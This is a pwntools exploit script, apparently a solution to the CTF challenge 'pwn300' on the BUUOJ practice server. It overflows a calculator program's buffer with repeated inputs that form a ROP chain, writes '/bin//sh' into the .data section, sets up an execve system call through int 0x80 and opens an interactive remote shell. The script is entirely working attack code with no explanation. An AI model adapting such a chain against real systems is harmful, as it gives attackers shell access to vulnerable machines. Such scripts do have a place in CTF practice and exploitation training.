#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./pwn300'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',27538)
			elf=ELF(elfelf)
			libc=ELF('../../i386libc/x86_libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('5 Save the result\n','1')
			io.sendlineafter('x:',str(a))
			io.sendlineafter('y:',str(b))


		def attack():
			io.sendlineafter('5 Save the result\n','5')
	
		io.sendlineafter('How many times do you want to calculate:','200')	


		for i in range(0x38//4):
			add(0,0)
		add(0,0x0807b75f)
		add(0,0x0807b75f)
		add(0,0x0807b75f)
		add(0,0x0806ed0a) # pop edx ; ret
		add(0,0x080ea060) # @ .data
		add(0,0x080bb406) # pop eax ; ret
		add(0,u32('/bin'))
		add(0,0x080a1dad) # mov dword ptr [edx], eax ; ret
		add(0,0x0806ed0a) # pop edx ; ret
		add(0,0x080ea064) # @ .data + 4
		add(0,0x080bb406) # pop eax ; ret
		add(0,u32('//sh'))
		add(0,0x080a1dad) # mov dword ptr [edx], eax ; ret
		add(0,0x0806ed0a) # pop edx ; ret
		add(0,0x080ea068) # @ .data + 8
		add(0,0x08054730) # xor eax, eax ; ret
		add(0,0x080a1dad) # mov dword ptr [edx], eax ; ret
		add(0,0x080481c9) # pop ebx ; ret
		add(0,0x080ea060) # @ .data
		add(0,0x0806ed31) # pop ecx ; pop ebx ; ret
		add(0,0x080ea068) # @ .data + 8
		add(0,0x080ea060) # padding without overwrite ebx
		add(0,0x0806ed0a) # pop edx ; ret
		add(0,0x080ea068) # @ .data + 8
		add(0,0x08054730) # xor eax, eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x0807b75f) # inc eax ; ret
		add(0,0x08049781) # int 0x80
		# gdb.attach(io)
		attack()



		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue